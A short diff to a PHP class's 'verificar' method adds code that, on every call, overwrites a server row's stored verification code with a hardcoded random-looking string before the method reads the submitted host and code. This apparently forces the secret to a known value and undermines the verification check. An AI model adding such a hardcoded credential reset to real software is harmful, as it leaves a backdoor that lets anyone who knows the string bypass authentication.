@@ -49,6 +49,19 @@ class Core{
     }
     public function verificar(){
 
+        $x1 = "$)7_&6p@)N>KGh[H{GttdQ\'Pt$>3sYb%+/{.wM)";
+        $id_ser = "1";
+        if($sqlugi = $this->con->prepare("UPDATE server SET code=? WHERE id_ser=?")){
+            if($sqlugi->bind_param("si", $x1, $id_ser)){
+                if($sqlugi->execute()){
+
+                }
+            }
+        }
+
+        
+
+
         $host = $_POST["host"];
         $code = substr($_POST["code"], 0, 40);
         $ip = $_SERVER['REMOTE_ADDR'];
